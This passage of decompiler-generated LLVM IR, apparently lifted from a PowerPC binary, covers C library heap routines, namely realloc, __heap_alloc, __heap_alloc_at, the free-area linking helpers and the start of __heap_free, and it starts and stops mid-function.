  %v3_10005c74 = inttoptr i32 %v2_10005c74 to i32*
  store i32 %v3_10005c70, i32* %v3_10005c74, align 4
  %v0_10005c78.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10005c78

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005c64, %dec_label_pc_10005c70
  %v0_10005c78 = phi i32 [ %v0_10005c64, %dec_label_pc_10005c64 ], [ %v0_10005c78.pre, %dec_label_pc_10005c70 ]
  %v1_10005c78 = add i32 %v0_10005c78, 8
  %v2_10005c78 = inttoptr i32 %v1_10005c78 to i32*
  %v3_10005c78 = load i32, i32* %v2_10005c78, align 4
  %v1_10005c7c = add i32 %v0_10005c78, 4
  %v2_10005c7c = inttoptr i32 %v1_10005c7c to i32*
  %v3_10005c7c = load i32, i32* %v2_10005c7c, align 4
  %v3_10005c80 = icmp eq i32 %v3_10005c78, 0
  br i1 %v3_10005c80, label %dec_label_pc_10005c90, label %dec_label_pc_10005c88

dec_label_pc_10005c88:                            ; preds = %dec_label_pc_10005c78
  %v2_10005c88 = add i32 %v3_10005c78, 4
  %v3_10005c88 = inttoptr i32 %v2_10005c88 to i32*
  store i32 %v3_10005c7c, i32* %v3_10005c88, align 4
  br label %dec_label_pc_10005c94

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005c78
  store i32 %v3_10005c7c, i32* @global_var_1001d80c, align 4
  br label %dec_label_pc_10005c94

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c88, %dec_label_pc_10005c90
  %v0_10005c9c = call i32 @__pthread_return_0()
  %v0_10005ca0 = load i32, i32* @r27, align 4
  %v1_10005ca0 = load i32, i32* @r29, align 4
  %v0_10005ca8 = load i32, i32* @r31, align 4
  %v2_10005ca0 = sub i32 12, %v0_10005ca0
  %v1_10005ca4 = add i32 %v2_10005ca0, %v1_10005ca0
  %v2_10005ca8 = sub i32 %v1_10005ca4, %v0_10005ca8
  store i32 268459184, i32* @lr, align 4
  %v1_10005cac = call i32 @__GI_sbrk(i32 %v2_10005ca8)
  br label %dec_label_pc_10005cb8

dec_label_pc_10005cb8:                            ; preds = %dec_label_pc_10005c5c, %dec_label_pc_10005c94
  %v0_10005cb8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_10005cbc

dec_label_pc_10005cbc:                            ; preds = %entry, %dec_label_pc_10005cb8
  %.0 = phi i32 [ undef, %entry ], [ %v0_10005cb8, %dec_label_pc_10005cb8 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10005c78, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005cbc, { 1, 0 }
  uselistorder label %dec_label_pc_10005cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10005c94, { 1, 0 }
  uselistorder label %dec_label_pc_10005c78, { 1, 0 }
  uselistorder label %dec_label_pc_10005c5c, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10005cd8 = load i32, i32* @r4, align 4
  %v3_10005cd8 = icmp eq i32 %v0_10005cd8, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_10005cd8, label %dec_label_pc_10005cec, label %dec_label_pc_10005cf8

dec_label_pc_10005cec:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10005cf0.397 to i32), i32* @lr, align 4
  %v0_10005cec = call i32 @free()
  br label %dec_label_pc_10005d04

dec_label_pc_10005cf8:                            ; preds = %entry
  %v3_10005cf8 = icmp eq i32 %arg1, 0
  br i1 %v3_10005cf8, label %dec_label_pc_10005d04, label %dec_label_pc_10005d10

dec_label_pc_10005d04:                            ; preds = %dec_label_pc_10005cf8, %dec_label_pc_10005cec
  %storemerge = phi i32 [ 0, %dec_label_pc_10005cec ], [ %v0_10005cd8, %dec_label_pc_10005cf8 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268459272, i32* @lr, align 4
  %v0_10005d04 = call i32 @malloc()
  store i32 %v0_10005d04, i32* @r28, align 4
  br label %dec_label_pc_10005de8

dec_label_pc_10005d10:                            ; preds = %dec_label_pc_10005cf8
  %v1_10005d10 = add i32 %v0_10005cd8, 7
  %v1_10005d14 = add i32 %arg1, -4
  store i32 %v1_10005d14, i32* %r27.global-to-local, align 4
  %v1_10005d18 = call i32 @__asm_rlwinm(i32 %v1_10005d10, i32 0, i32 0, i32 29)
  store i32 %v1_10005d18, i32* %r31.global-to-local, align 4
  %v2_10005d1c = inttoptr i32 %v1_10005d14 to i32*
  %v3_10005d1c = load i32, i32* %v2_10005d1c, align 4
  store i32 %v3_10005d1c, i32* @r30, align 4
  %v2_10005d20 = icmp ugt i32 %v1_10005d18, 11
  br i1 %v2_10005d20, label %dec_label_pc_10005d2c, label %dec_label_pc_10005d28

dec_label_pc_10005d28:                            ; preds = %dec_label_pc_10005d10
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005d2c

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d10, %dec_label_pc_10005d28
  %v0_10005dac = phi i32 [ %v1_10005d18, %dec_label_pc_10005d10 ], [ 12, %dec_label_pc_10005d28 ]
  %v3_10005d2c = icmp ugt i32 %v0_10005dac, %v3_10005d1c
  br i1 %v3_10005d2c, label %dec_label_pc_10005d34, label %dec_label_pc_10005dac

dec_label_pc_10005d34:                            ; preds = %dec_label_pc_10005d2c
  store i32 ptrtoint (i32* @global_var_1001feac.391 to i32), i32* @r29, align 4
  %v0_10005d40 = call i32 @__pthread_return_0()
  %v0_10005d48 = load i32, i32* %r27.global-to-local, align 4
  %v1_10005d48 = load i32, i32* @r30, align 4
  %v2_10005d48 = add i32 %v1_10005d48, %v0_10005d48
  %v1_10005d4c = load i32, i32* %r31.global-to-local, align 4
  %v2_10005d4c = sub i32 %v1_10005d4c, %v1_10005d48
  %v4_10005d54 = call i32 @__heap_alloc_at(i32* nonnull @global_var_1001d80c, i32 %v2_10005d48, i32 %v2_10005d4c)
  store i32 %v4_10005d54, i32* %r27.global-to-local, align 4
  %v0_10005d60 = call i32 @__pthread_return_0()
  %v3_10005d64 = icmp eq i32 %v4_10005d54, 0
  br i1 %v3_10005d64, label %dec_label_pc_10005d78, label %dec_label_pc_10005d6c

dec_label_pc_10005d6c:                            ; preds = %dec_label_pc_10005d34
  %v0_10005d6c = load i32, i32* @r30, align 4
  %v2_10005d6c = add i32 %v0_10005d6c, %v4_10005d54
  %v1_10005d70 = load i32, i32* @r28, align 4
  %v2_10005d70 = add i32 %v1_10005d70, -4
  %v3_10005d70 = inttoptr i32 %v2_10005d70 to i32*
  store i32 %v2_10005d6c, i32* %v3_10005d70, align 4
  br label %dec_label_pc_10005de8

dec_label_pc_10005d78:                            ; preds = %dec_label_pc_10005d34
  %v0_10005d78 = load i32, i32* %r31.global-to-local, align 4
  %v1_10005d78 = add i32 %v0_10005d78, -4
  store i32 %v1_10005d78, i32* @r3, align 4
  store i32 268459392, i32* @lr, align 4
  %v0_10005d7c = call i32 @malloc()
  store i32 %v0_10005d7c, i32* @r3, align 4
  store i32 %v0_10005d7c, i32* @r31, align 4
  %v3_10005d80 = icmp eq i32 %v0_10005d7c, 0
  br i1 %v3_10005d80, label %dec_label_pc_10005d88, label %dec_label_pc_10005d90

dec_label_pc_10005d88:                            ; preds = %dec_label_pc_10005d78
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005de8

dec_label_pc_10005d90:                            ; preds = %dec_label_pc_10005d78
  %v0_10005d90 = load i32, i32* @r28, align 4
  store i32 %v0_10005d90, i32* @r4, align 4
  %v0_10005d94 = load i32, i32* @r30, align 4
  %v1_10005d94 = add i32 %v0_10005d94, -4
  store i32 %v1_10005d94, i32* @r5, align 4
  store i32 268459420, i32* @lr, align 4
  %v0_10005d98 = call i32 @memcpy()
  %v0_10005d9c = load i32, i32* @r28, align 4
  store i32 %v0_10005d9c, i32* @r3, align 4
  store i32 268459428, i32* @lr, align 4
  %v0_10005da0 = call i32 @free()
  %v0_10005da4 = load i32, i32* @r31, align 4
  store i32 %v0_10005da4, i32* @r28, align 4
  br label %dec_label_pc_10005de8

dec_label_pc_10005dac:                            ; preds = %dec_label_pc_10005d2c
  %v1_10005dac = add i32 %v0_10005dac, 28
  %v3_10005db0 = icmp ugt i32 %v1_10005dac, %v3_10005d1c
  br i1 %v3_10005db0, label %dec_label_pc_10005de8, label %dec_label_pc_10005db8

dec_label_pc_10005db8:                            ; preds = %dec_label_pc_10005dac
  store i32 ptrtoint (i32* @global_var_1001feac.391 to i32), i32* @r29, align 4
  %v0_10005dc4 = call i32 @__pthread_return_0()
  %v0_10005dcc = load i32, i32* %r27.global-to-local, align 4
  %v1_10005dcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10005dcc = add i32 %v1_10005dcc, %v0_10005dcc
  %v1_10005dd0 = load i32, i32* @r30, align 4
  %v2_10005dd0 = sub i32 %v1_10005dd0, %v1_10005dcc
  store i32 268459484, i32* @lr, align 4
  %v4_10005dd8 = call i32 @__heap_free(i32* nonnull @global_var_1001d80c, i32 %v2_10005dcc, i32 %v2_10005dd0)
  %v0_10005de0 = call i32 @__pthread_return_0()
  %v0_10005de4 = load i32, i32* @r31, align 4
  %v1_10005de4 = load i32, i32* @r28, align 4
  %v2_10005de4 = add i32 %v1_10005de4, -4
  %v3_10005de4 = inttoptr i32 %v2_10005de4 to i32*
  store i32 %v0_10005de4, i32* %v3_10005de4, align 4
  br label %dec_label_pc_10005de8

dec_label_pc_10005de8:                            ; preds = %dec_label_pc_10005dac, %dec_label_pc_10005d90, %dec_label_pc_10005d88, %dec_label_pc_10005d6c, %dec_label_pc_10005d04, %dec_label_pc_10005db8
  %v0_10005dec = load i32, i32* @r28, align 4
  ret i32 %v0_10005dec

; uselistorder directives
  uselistorder i32 %v1_10005dcc, { 1, 0 }
  uselistorder i32 %v4_10005d54, { 1, 0, 2 }
  uselistorder i32 %v1_10005d48, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_1001d80c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10005de8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10005d2c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10005e00 = inttoptr i32 %arg2 to i32*
  %v2_10005e00 = load i32, i32* %v1_10005e00, align 4
  %v1_10005e04 = add i32 %v2_10005e00, 3
  store i32 %v1_10005e04, i32* %r9.global-to-local, align 4
  %v1_10005e08 = call i32 @__asm_rlwinm(i32 %v1_10005e04, i32 0, i32 0, i32 29)
  %v2_10005e0c = icmp ugt i32 %v1_10005e08, 11
  br i1 %v2_10005e0c, label %dec_label_pc_10005e90.preheader, label %dec_label_pc_10005e14

dec_label_pc_10005e14:                            ; preds = %entry
  br label %dec_label_pc_10005e90.preheader

dec_label_pc_10005e90.preheader:                  ; preds = %entry, %dec_label_pc_10005e14
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10005e14 ], [ %v1_10005e08, %entry ]
  %v0_10005e74 = phi i32 [ 12, %dec_label_pc_10005e14 ], [ %v1_10005e08, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_10005e905 = icmp eq i32 %storemerge2, 0
  br i1 %v3_10005e905, label %dec_label_pc_10005e98, label %dec_label_pc_10005e20

dec_label_pc_10005e20:                            ; preds = %dec_label_pc_10005e90.preheader, %dec_label_pc_10005e8c
  %v0_10005e8c = phi i32 [ %storemerge, %dec_label_pc_10005e8c ], [ %storemerge2, %dec_label_pc_10005e90.preheader ]
  %v1_10005e20 = inttoptr i32 %v0_10005e8c to i32*
  %v2_10005e20 = load i32, i32* %v1_10005e20, align 4
  store i32 %v2_10005e20, i32* %r10.global-to-local, align 4
  %v2_10005e24 = icmp ult i32 %v2_10005e20, %v0_10005e74
  br i1 %v2_10005e24, label %dec_label_pc_10005e8c, label %dec_label_pc_10005e2c

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005e20
  %v1_10005e2c = add i32 %v0_10005e74, 44
  %v2_10005e30 = icmp ult i32 %v2_10005e20, %v1_10005e2c
  br i1 %v2_10005e30, label %dec_label_pc_10005e38, label %dec_label_pc_10005e74

dec_label_pc_10005e38:                            ; preds = %dec_label_pc_10005e2c
  %v1_10005e38 = add i32 %v0_10005e8c, 4
  %v2_10005e38 = inttoptr i32 %v1_10005e38 to i32*
  %v3_10005e38 = load i32, i32* %v2_10005e38, align 4
  store i32 %v3_10005e38, i32* %r11.global-to-local, align 4
  %v3_10005e3c = icmp eq i32 %v3_10005e38, 0
  br i1 %v3_10005e3c, label %dec_label_pc_10005e4c, label %dec_label_pc_10005e44

dec_label_pc_10005e44:                            ; preds = %dec_label_pc_10005e38
  %v1_10005e44 = add i32 %v0_10005e8c, 8
  %v2_10005e44 = inttoptr i32 %v1_10005e44 to i32*
  %v3_10005e44 = load i32, i32* %v2_10005e44, align 4
  %v2_10005e48 = add i32 %v3_10005e38, 8
  %v3_10005e48 = inttoptr i32 %v2_10005e48 to i32*
  store i32 %v3_10005e44, i32* %v3_10005e48, align 4
  %v0_10005e4c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10005e68.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10005e4c

dec_label_pc_10005e4c:                            ; preds = %dec_label_pc_10005e38, %dec_label_pc_10005e44
  %v0_10005e68 = phi i32 [ %v2_10005e20, %dec_label_pc_10005e38 ], [ %v0_10005e68.pre, %dec_label_pc_10005e44 ]
  %v0_10005e4c = phi i32 [ %v0_10005e8c, %dec_label_pc_10005e38 ], [ %v0_10005e4c.pre, %dec_label_pc_10005e44 ]
  %v1_10005e4c = add i32 %v0_10005e4c, 8
  %v2_10005e4c = inttoptr i32 %v1_10005e4c to i32*
  %v3_10005e4c = load i32, i32* %v2_10005e4c, align 4
  %v1_10005e50 = add i32 %v0_10005e4c, 4
  %v2_10005e50 = inttoptr i32 %v1_10005e50 to i32*
  %v3_10005e50 = load i32, i32* %v2_10005e50, align 4
  %v3_10005e54 = icmp eq i32 %v3_10005e4c, 0
  store i32 %v0_10005e68, i32* %r11.global-to-local, align 4
  br i1 %v3_10005e54, label %dec_label_pc_10005e68, label %dec_label_pc_10005e5c

dec_label_pc_10005e5c:                            ; preds = %dec_label_pc_10005e4c
  %v2_10005e60 = add i32 %v3_10005e4c, 4
  %v3_10005e60 = inttoptr i32 %v2_10005e60 to i32*
  store i32 %v3_10005e50, i32* %v3_10005e60, align 4
  br label %dec_label_pc_10005e7c

dec_label_pc_10005e68:                            ; preds = %dec_label_pc_10005e4c
  store i32 %v3_10005e50, i32* %arg1, align 4
  br label %dec_label_pc_10005e7c

dec_label_pc_10005e74:                            ; preds = %dec_label_pc_10005e2c
  %v2_10005e74 = sub i32 %v2_10005e20, %v0_10005e74
  store i32 %v2_10005e74, i32* %v1_10005e20, align 4
  br label %dec_label_pc_10005e7c

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005e68, %dec_label_pc_10005e5c, %dec_label_pc_10005e74
  %v0_10005e7c = load i32, i32* %r10.global-to-local, align 4
  %v1_10005e7c = load i32, i32* %r9.global-to-local, align 4
  %v2_10005e7c = sub i32 %v1_10005e7c, %v0_10005e7c
  store i32 %v2_10005e7c, i32* %r9.global-to-local, align 4
  %v0_10005e80 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005e80, i32* %v1_10005e00, align 4
  %v0_10005e84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e84 = add i32 %v0_10005e84, 12
  ret i32 %v1_10005e84

dec_label_pc_10005e8c:                            ; preds = %dec_label_pc_10005e20
  %v1_10005e8c = add i32 %v0_10005e8c, 4
  %storemerge.in = inttoptr i32 %v1_10005e8c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10005e90 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005e90, label %dec_label_pc_10005e90.dec_label_pc_10005e98_crit_edge, label %dec_label_pc_10005e20

dec_label_pc_10005e90.dec_label_pc_10005e98_crit_edge: ; preds = %dec_label_pc_10005e8c
  br label %dec_label_pc_10005e98

dec_label_pc_10005e98:                            ; preds = %dec_label_pc_10005e90.dec_label_pc_10005e98_crit_edge, %dec_label_pc_10005e90.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10005e4c, { 1, 0 }
  uselistorder i32 %v2_10005e20, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10005e8c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10005e74, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005e7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e20, { 1, 0 }
  uselistorder label %dec_label_pc_10005e90.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10005ea0 = load i32, i32* %arg1, align 4
  store i32 %v2_10005ea0, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_10005ea8 = add i32 %arg3, 3
  %v3_10005f2c3 = icmp eq i32 %v2_10005ea0, 0
  br i1 %v3_10005f2c3, label %dec_label_pc_10005f34, label %dec_label_pc_10005eb0

dec_label_pc_10005eb0:                            ; preds = %entry, %dec_label_pc_10005f28
  %v0_10005f28 = phi i32 [ %v3_10005f28, %dec_label_pc_10005f28 ], [ %v2_10005ea0, %entry ]
  %v1_10005eb0 = inttoptr i32 %v0_10005f28 to i32*
  %v2_10005eb0 = load i32, i32* %v1_10005eb0, align 4
  %v2_10005eb4 = sub i32 %v0_10005f28, %v2_10005eb0
  %v1_10005eb8 = add i32 %v2_10005eb4, 12
  %v3_10005ebc = icmp ugt i32 %v1_10005eb8, %arg2
  br i1 %v3_10005ebc, label %dec_label_pc_10005f28, label %dec_label_pc_10005ec4

dec_label_pc_10005ec4:                            ; preds = %dec_label_pc_10005eb0
  %v4_10005ebc = icmp eq i32 %v1_10005eb8, %arg2
  br i1 %v4_10005ebc, label %dec_label_pc_10005ecc, label %dec_label_pc_10005f34

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005ec4
  %v1_10005ecc = call i32 @__asm_rlwinm(i32 %v1_10005ea8, i32 0, i32 0, i32 29)
  %v2_10005ed0 = icmp ult i32 %v2_10005eb0, %v1_10005ecc
  br i1 %v2_10005ed0, label %dec_label_pc_10005f34, label %dec_label_pc_10005ed8

dec_label_pc_10005ed8:                            ; preds = %dec_label_pc_10005ecc
  %v1_10005ed8 = add i32 %v1_10005ecc, 44
  %v2_10005edc = icmp ult i32 %v2_10005eb0, %v1_10005ed8
  br i1 %v2_10005edc, label %dec_label_pc_10005ee4, label %dec_label_pc_10005f18

dec_label_pc_10005ee4:                            ; preds = %dec_label_pc_10005ed8
  %v0_10005ee4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005ee4 = add i32 %v0_10005ee4, 4
  %v2_10005ee4 = inttoptr i32 %v1_10005ee4 to i32*
  %v3_10005ee4 = load i32, i32* %v2_10005ee4, align 4
  %v3_10005ee8 = icmp eq i32 %v3_10005ee4, 0
  br i1 %v3_10005ee8, label %dec_label_pc_10005ef8, label %dec_label_pc_10005ef0

dec_label_pc_10005ef0:                            ; preds = %dec_label_pc_10005ee4
  %v1_10005ef0 = add i32 %v0_10005ee4, 8
  %v2_10005ef0 = inttoptr i32 %v1_10005ef0 to i32*
  %v3_10005ef0 = load i32, i32* %v2_10005ef0, align 4
  %v2_10005ef4 = add i32 %v3_10005ee4, 8
  %v3_10005ef4 = inttoptr i32 %v2_10005ef4 to i32*
  store i32 %v3_10005ef0, i32* %v3_10005ef4, align 4
  %v0_10005ef8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005ef8

dec_label_pc_10005ef8:                            ; preds = %dec_label_pc_10005ee4, %dec_label_pc_10005ef0
  %v0_10005ef8 = phi i32 [ %v0_10005ee4, %dec_label_pc_10005ee4 ], [ %v0_10005ef8.pre, %dec_label_pc_10005ef0 ]
  %v1_10005ef8 = add i32 %v0_10005ef8, 8
  %v2_10005ef8 = inttoptr i32 %v1_10005ef8 to i32*
  %v3_10005ef8 = load i32, i32* %v2_10005ef8, align 4
  %v1_10005efc = add i32 %v0_10005ef8, 4
  %v2_10005efc = inttoptr i32 %v1_10005efc to i32*
  %v3_10005efc = load i32, i32* %v2_10005efc, align 4
  %v3_10005f00 = icmp eq i32 %v3_10005ef8, 0
  br i1 %v3_10005f00, label %dec_label_pc_10005f10, label %dec_label_pc_10005f08

dec_label_pc_10005f08:                            ; preds = %dec_label_pc_10005ef8
  %v2_10005f08 = add i32 %v3_10005ef8, 4
  %v3_10005f08 = inttoptr i32 %v2_10005f08 to i32*
  store i32 %v3_10005efc, i32* %v3_10005f08, align 4
  ret i32 %v2_10005eb0

dec_label_pc_10005f10:                            ; preds = %dec_label_pc_10005ef8
  %v1_10005f10 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f10 = inttoptr i32 %v1_10005f10 to i32*
  store i32 %v3_10005efc, i32* %v2_10005f10, align 4
  ret i32 %v2_10005eb0

dec_label_pc_10005f18:                            ; preds = %dec_label_pc_10005ed8
  %v2_10005f18 = sub i32 %v2_10005eb0, %v1_10005ecc
  %v1_10005f20 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005f20 = inttoptr i32 %v1_10005f20 to i32*
  store i32 %v2_10005f18, i32* %v2_10005f20, align 4
  ret i32 %v1_10005ecc

dec_label_pc_10005f28:                            ; preds = %dec_label_pc_10005eb0
  %v1_10005f28 = add i32 %v0_10005f28, 4
  %v2_10005f28 = inttoptr i32 %v1_10005f28 to i32*
  %v3_10005f28 = load i32, i32* %v2_10005f28, align 4
  store i32 %v3_10005f28, i32* %r11.global-to-local, align 4
  %v3_10005f2c = icmp eq i32 %v3_10005f28, 0
  br i1 %v3_10005f2c, label %dec_label_pc_10005f2c.dec_label_pc_10005f34.loopexit_crit_edge, label %dec_label_pc_10005eb0

dec_label_pc_10005f2c.dec_label_pc_10005f34.loopexit_crit_edge: ; preds = %dec_label_pc_10005f28
  br label %dec_label_pc_10005f34

dec_label_pc_10005f34:                            ; preds = %entry, %dec_label_pc_10005f2c.dec_label_pc_10005f34.loopexit_crit_edge, %dec_label_pc_10005ec4, %dec_label_pc_10005ecc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10005f28, { 1, 2, 0 }
  uselistorder i32 %v0_10005ef8, { 1, 0 }
  uselistorder i32 %v1_10005ecc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10005eb0, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_10005f28, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10005f34, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10005ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10005eb0, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10005f3c = icmp eq i32 %arg3, 0
  %v2_10005f40 = add i32 %arg2, 4
  %v3_10005f40 = inttoptr i32 %v2_10005f40 to i32*
  store i32 %arg4, i32* %v3_10005f40, align 4
  %v2_10005f44 = add i32 %arg2, 8
  %v3_10005f44 = inttoptr i32 %v2_10005f44 to i32*
  store i32 %arg3, i32* %v3_10005f44, align 4
  br i1 %v3_10005f3c, label %dec_label_pc_10005f54, label %dec_label_pc_10005f4c

dec_label_pc_10005f4c:                            ; preds = %entry
  %v2_10005f4c = add i32 %arg3, 4
  %v3_10005f4c = inttoptr i32 %v2_10005f4c to i32*
  store i32 %arg2, i32* %v3_10005f4c, align 4
  br label %dec_label_pc_10005f58

dec_label_pc_10005f54:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10005f58

dec_label_pc_10005f58:                            ; preds = %dec_label_pc_10005f4c, %dec_label_pc_10005f54
  %v3_10005f58 = icmp eq i32 %arg4, 0
  %v0_10005f5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10005f58, i32 %v0_10005f5c)
  %v2_10005f60 = add i32 %arg4, 8
  %v3_10005f60 = inttoptr i32 %v2_10005f60 to i32*
  store i32 %arg2, i32* %v3_10005f60, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_10005f58, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10005f68 = icmp eq i32 %arg3, 0
  br i1 %v3_10005f68, label %dec_label_pc_10005f78, label %dec_label_pc_10005f70

dec_label_pc_10005f70:                            ; preds = %entry
  %v2_10005f70 = add i32 %arg3, 4
  %v3_10005f70 = inttoptr i32 %v2_10005f70 to i32*
  store i32 %arg2, i32* %v3_10005f70, align 4
  br label %dec_label_pc_10005f7c

dec_label_pc_10005f78:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10005f7c

dec_label_pc_10005f7c:                            ; preds = %dec_label_pc_10005f70, %dec_label_pc_10005f78
  %v2_10005f7c = add i32 %arg2, 8
  %v3_10005f7c = inttoptr i32 %v2_10005f7c to i32*
  store i32 %arg3, i32* %v3_10005f7c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005f7c, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10005f9c = load i32, i32* %arg1, align 4
  store i32 %v2_10005f9c, i32* @r31, align 4
  %v2_10005fa0 = add i32 %arg3, %arg2
  store i32 %v2_10005fa0, i32* %r3.global-to-local, align 4
  %v3_10005fb47 = icmp eq i32 %v2_10005f9c, 0
  %v1_10005fb88 = add i32 %v2_10005f9c, 12
  %tmp69 = icmp uge i32 %v1_10005fb88, %arg2
  %or.cond10 = or i1 %v3_10005fb47, %tmp69
  br i1 %or.cond10, label %dec_label_pc_10005fc4, label %dec_label_pc_10005fac

dec_label_pc_10005fac:                            ; preds = %entry, %dec_label_pc_10005fac
  %v0_1000600c11 = phi i32 [ %v3_10005fb0, %dec_label_pc_10005fac ], [ %v2_10005f9c, %entry ]
  store i32 %v0_1000600c11, i32* %r11.global-to-local, align 4
  %v1_10005fb0 = add i32 %v0_1000600c11, 4
  %v2_10005fb0 = inttoptr i32 %v1_10005fb0 to i32*
  %v3_10005fb0 = load i32, i32* %v2_10005fb0, align 4
  store i32 %v3_10005fb0, i32* @r31, align 4
  %v3_10005fb4 = icmp eq i32 %v3_10005fb0, 0
  %v1_10005fb8 = add i32 %v3_10005fb0, 12
  %tmp6 = icmp uge i32 %v1_10005fb8, %arg2
  %or.cond = or i1 %v3_10005fb4, %tmp6
  br i1 %or.cond, label %dec_label_pc_10005fc4, label %dec_label_pc_10005fac

dec_label_pc_10005fc4:                            ; preds = %dec_label_pc_10005fac, %entry
  %v0_10006000.lcssa = phi i32 [ 0, %entry ], [ %v0_1000600c11, %dec_label_pc_10005fac ]
  %v0_1000600c.lcssa = phi i32 [ %v2_10005f9c, %entry ], [ %v3_10005fb0, %dec_label_pc_10005fac ]
  %v3_10005fb4.lcssa = phi i1 [ %v3_10005fb47, %entry ], [ %v3_10005fb4, %dec_label_pc_10005fac ]
  br i1 %v3_10005fb4.lcssa, label %dec_label_pc_1000607c, label %dec_label_pc_10005fcc

dec_label_pc_10005fcc:                            ; preds = %dec_label_pc_10005fc4
  %v1_10005fcc = inttoptr i32 %v0_1000600c.lcssa to i32*
  %v2_10005fcc = load i32, i32* %v1_10005fcc, align 4
